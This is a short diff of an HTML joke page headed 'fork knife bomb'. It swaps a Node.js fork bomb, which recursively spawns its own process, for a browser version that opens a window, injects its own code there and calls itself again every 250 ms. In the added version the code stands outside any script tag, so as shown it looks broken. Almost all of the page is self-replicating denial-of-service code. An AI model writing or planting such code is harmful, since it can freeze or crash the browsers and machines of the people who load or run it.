@@ -6,9 +6,17 @@
 <body>
 <h1>Oh boy it's a fork knife bomb!</h1>
 <h1>🍴💣</h1>
-<script src="node.js"></script>
-<script>
-(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
-</script>
+function fork() {
+  const win = window.open();
+  const script = win.document.createElement("script");
+  script.innerHTML = fork + "\n" + "fork();";
+  win.document.head.appendChild(script);
+  setTimeout(function() {
+    win.close();
+    fork();
+  }, 250)
+}
+
+fork();
 </body>
 </html>
